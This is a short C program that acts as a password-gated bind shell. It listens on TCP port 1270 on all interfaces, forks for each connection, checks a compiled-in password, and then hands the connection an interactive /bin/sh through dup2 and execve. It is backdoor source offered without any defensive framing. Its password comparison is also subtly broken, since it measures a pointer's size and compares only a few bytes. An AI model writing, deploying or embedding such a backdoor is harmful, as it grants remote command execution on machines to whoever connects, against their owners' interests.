#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

static const char s_password[] = password;

bool check_password(const char* p_password){
	return memcmp(s_password, p_password, sizeof(p_password)-1) != 0;
}

int main(int p_argc, char** p_argv){
	(void) p_argc;
	(void) p_argv;

	int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == -1){
		fprintf(stderr, "Failed to create socket\n");
		return EXIT_FAILURE;
	}

	struct sockaddr_in bind_addr = {};
	bind_addr.sin_family = AF_INET;
	bind_addr.sin_addr.s_addr = htonl(INADDR_ANY);
	bind_addr.sin_port = htons(1270);

	if (bind(sock, (struct sockaddr*) &bind_addr, sizeof(bind_addr)) ){
		perror("Bind call failed");
		return EXIT_FAILURE;
	}

	if (listen(sock, 5) ){
		perror("Listen call failed");
		return EXIT_FAILURE;
	}

	while (true){
		int client_sock = accept(sock, NULL, NULL);
		if (client_sock < 0 ){
			perror("Accept call failed");
			//return EXIT_FAILURE;
			continue;
		}

		int child_pid = fork();
		if (!child_pid){
			char password_input[sizeof(s_password)] = { 0 };
			if (read(client_sock, password_input, sizeof(password_input)) < (int)sizeof(s_password) - 1){
				fprintf(stderr, "Bad read\n");
				close(client_sock);
				return EXIT_FAILURE;
			}

			if (check_password(password_input)){
				fprintf(stderr, "Bad password\n");
				close(client_sock);
				return EXIT_FAILURE;
			}

			dup2(client_sock, 0);
			dup2(client_sock, 1);
			dup2(client_sock, 2);

			char* empty[] = {NULL};
			execve("/bin/sh", empty, empty);
			close(client_sock);
			return EXIT_SUCCESS;
		}

		close(client_sock);
	}
}